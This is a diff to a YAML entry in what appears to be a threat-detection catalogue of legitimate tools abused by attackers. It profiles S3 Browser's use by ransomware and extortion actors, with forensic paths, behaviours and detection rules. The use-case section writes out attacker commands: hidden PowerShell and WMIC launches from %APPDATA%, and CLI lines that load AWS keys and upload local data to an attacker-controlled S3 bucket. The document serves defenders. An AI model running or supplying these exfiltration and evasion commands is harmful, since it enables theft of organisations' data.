@@ -1,10 +1,10 @@
 Name: S3 Browser
 Description: >
-  S3 Browser is a legitimate Windows GUI client for Amazon S3, enabling users to upload, download,
-  and manage objects in cloud storage. While designed for administrative use, it has been abused
-  by ransomware and extortion actors for data exfiltration, leveraging its trusted HTTPS
-  connections to Amazon AWS. Attackers use both GUI and command-line variants, often executing
-  from non-standard paths or silently through PowerShell to avoid detection.
+  S3 Browser is a legitimate Windows GUI and CLI client for Amazon S3, enabling users to upload,
+  download, and manage objects in cloud storage. While intended for administrative use, it has
+  been abused by ransomware and extortion actors for data exfiltration, leveraging trusted
+  HTTPS connections to AWS S3. Threat actors commonly deploy portable copies from non-standard
+  paths or invoke the CLI variant via scripts to perform stealthy, large-scale uploads.
 Category: cloud-based
 Platform:
   - Windows
@@ -13,10 +13,10 @@ Execution:
   - cli
 Capabilities:
   - cloud-sync               # Supports syncing files with S3 buckets through GUI or CLI.
-  - encrypted-transfer       # Uses HTTPS for secure data transfer to Amazon S3.
-  - silent-execution         # Can run in background or hidden via PowerShell/batch for stealthy exfiltration.
-  - credentialed-upload      # Requires AWS access keys or tokens, often hardcoded or preloaded.
-  - portable-execution       # Can be copied and executed from non-standard or user-writable paths (e.g., %APPDATA%).
+  - encrypted-transfer       # Uses HTTPS and AWS SigV4 for secure data transfer to Amazon S3.
+  - silent-execution         # Can be executed hidden or non-interactively via PowerShell or batch files.
+  - credentialed-upload      # Requires AWS access keys or session tokens, often hardcoded or preloaded.
+  - portable-execution       # Frequently executed from user-writable paths to evade application controls.
 Forensics:
   BinaryLocations:
     - C:\Program Files (x86)\S3 Browser\s3browser-ui.exe
@@ -34,91 +34,82 @@ Forensics:
     - TEMP\s3browser.log
   CommandLineArgs:
     - /file upload              # Uploads a file or directory to an S3 bucket.
-    - /account add              # Adds a configured AWS account for exfil operations.
-    - /license                  # Seen in malware samples (e.g., self-extracting droppers).
+    - /account add              # Adds or configures AWS credentials for uploads.
+    - /license                  # Observed in self-extracting droppers and cracked distributions.
   ConfigFiles:
     - C:\Users\<user>\AppData\Roaming\S3Browser\s3browser.settings.v4
   ScheduledTask: []
   RegistryPersistence: []
   NetworkArtifacts:
     Description: >
-      S3 Browser communicates with AWS S3 over HTTPS using the same APIs as legitimate administrative activity.
-      Detection opportunities include monitoring for unusual S3 bucket uploads from user endpoints,
-      large outbound transfers to S3 regions outside the organization’s normal geography,
-      or AWS access keys observed in memory or process command lines.
-    Indicators:
-      - "*.s3.amazonaws.com"
-      - "*.s3.*.amazonaws.com"
-      - "PUT /"                      # File upload operations to S3 buckets
-      - "POST /"                     # Multipart or form-based uploads
-      - "'s3browser.exe' with 'access-key-id' in arguments"
-      - "x-amz-security-token"       # AWS authentication header
+      S3 Browser communicates with Amazon S3 using standard AWS APIs over HTTPS.
+      Network destinations, bucket names, and regions are fully operator-controlled,
+      making static network indicators unreliable for rule-based detection.
+    Indicators: []
+NetworkBehavior:
+  Description: >
+    S3 Browser performs authenticated HTTPS sessions to AWS S3 endpoints, typically
+    initiating sustained outbound transfers following local directory enumeration.
+    In malicious use, uploads often occur from user endpoints, non-backup systems,
+    or at unusual times, and may involve bulk transfers immediately after staging
+    or archive creation.
+  Behaviors:
+    - authenticated HTTPS sessions using AWS SigV4
+    - sustained high bytes_out to a single cloud destination
+    - bulk uploads following local file enumeration
+    - execution from user-writable paths rather than installed locations
+    - optional CLI-driven transfers without GUI interaction
 ThreatActors:
   - ransomware
   - apt
-Tags:
-  - commonly-used
-  - cloud-tool
-  - stealth
-  - persistence
 UseCases:
   - Title: Standard GUI Upload
     Description: >
-      Legitimate use case — manual file uploads using the S3 Browser interface.
-      Threat actors may exploit this in compromised systems with GUI access.
+      Manual file uploads using the S3 Browser interface. Threat actors may abuse this
+      capability on compromised systems with interactive access.
     Command: |
       "C:\Program Files\S3 Browser\s3browser-ui.exe"
-  - Title: Post-Exploitation GUI Execution
+  - Title: Post-Exploitation Portable Execution
     Description: >
-      Attacker copies S3 Browser binaries to a user-writable location and executes from there.
-      Indicates potential evasion of application control or tampering.
+      Attacker copies S3 Browser binaries to a user-writable directory and executes them
+      to bypass application allowlisting or monitoring tied to Program Files.
     Command: |
       Start-Process "$env:APPDATA\S3Tools\s3browser-ui.exe"
   - Title: Hidden Execution via PowerShell
     Description: >
-      S3 Browser is executed silently without showing the interface, simulating covert exfiltration.
+      S3 Browser is launched with a hidden window to reduce user visibility during exfiltration.
     Command: |
       Start-Process "$env:APPDATA\S3Tools\s3browser-ui.exe" -WindowStyle Hidden
-  - Title: Batch Dropper Execution
+  - Title: CLI-Based Exfiltration
     Description: >
-      Launches S3 Browser via batch file for stealthy startup from a non-standard directory.
+      Uses the S3 Browser CLI to script uploads to attacker-controlled S3 buckets using
+      embedded or preloaded AWS credentials.
     Command: |
-      @echo off
-      start "" "%APPDATA%\S3Tools\s3browser-ui.exe"
-  - Title: Command-Line Exfiltration
+      s3browser-cli.exe /account add 0 "exfil-profile" access-key-id=<AKIA...> secret-access-key=<secret>
+      s3browser-cli.exe /file upload "exfil-profile" C:\Temp\data s3://bucket/path
+  - Title: LOLBIN-Assisted Launch
     Description: >
-      Uses S3 Browser CLI for file uploads to AWS S3 buckets using access keys.
-    Command: |
-      s3browser-cli.exe /account add 0 "ShinyHunters-POC" access-key-id=<AKIA...> secret-access-key=<secret>
-      s3browser-cli.exe /file upload "ShinyHunters-POC" C:\Temp\img_backup shinyhunters-poc/test-cli
-  - Title: LOLBIN-Based Execution
-    Description: >
-      Simulates attacker launching S3 Browser via Windows Management Instrumentation (WMIC)
-      to evade process chain detections.
+      S3 Browser executed via Windows management utilities to obscure the process chain.
     Command: |
       wmic process call create "$env:APPDATA\S3Tools\s3browser-ui.exe"
 Detection:
   - Type: Execution from Non-Standard Path
     Description: >
-      Monitor for `s3browser-ui.exe` or `s3browser-cli.exe` executed from user-writable locations like `%APPDATA%`, `%TEMP%`, or `%PUBLIC%`.
-      This may indicate the use of a portable version dropped by an attacker.
+      Detect S3 Browser binaries executed from user-writable locations such as `%APPDATA%`,
+      `%TEMP%`, or `%PUBLIC%`, especially on systems not used for cloud administration.
   - Type: Suspicious Parent Process
     Description: >
-      Alert if S3 Browser is launched by LOLBINs such as `powershell.exe`, `wmic.exe`, or `cmd.exe`.
-      These patterns suggest post-exploitation use or automation.
-  - Type: Network Volume Spike
+      Alert when S3 Browser is launched by scripting engines or LOLBINs such as
+      `powershell.exe`, `wmic.exe`, or `cmd.exe`.
+  - Type: Cloud Upload from User Endpoint
     Description: >
-      Detect large or bursty HTTPS traffic to `*.s3.amazonaws.com` or unusual AWS regions from user workstations.
-      Consider monitoring for `PUT` or `POST` operations associated with object uploads.
-  - Type: Config File Modification
+      Correlate S3 Browser execution with large outbound HTTPS transfers from workstations
+      or servers that do not normally perform backups or S3 administration.
+  - Type: CLI Upload Abuse
     Description: >
-      Monitor for unexpected creation or updates to `s3browser.settings.v4` in non-standard paths,
-      especially if no GUI interaction was observed.
-  - Type: CLI Upload Usage
-    Description: >
-      Detect command-line invocations of `s3browser-cli.exe` using `/file upload` or `/account add`.
-      This suggests script-based or stealthy exfiltration activity.
+      Detect command-line usage of `s3browser-cli.exe` with `/file upload` or `/account add`,
+      indicating scripted or stealthy exfiltration.
 References:
   - https://unit42.paloaltonetworks.com/large-scale-cloud-extortion-operation/
   - https://unit42.paloaltonetworks.com/shinyhunters-ransomware-extortion/
-LastModified: '2025-11-17'
+LastModified: '2025-12-12'
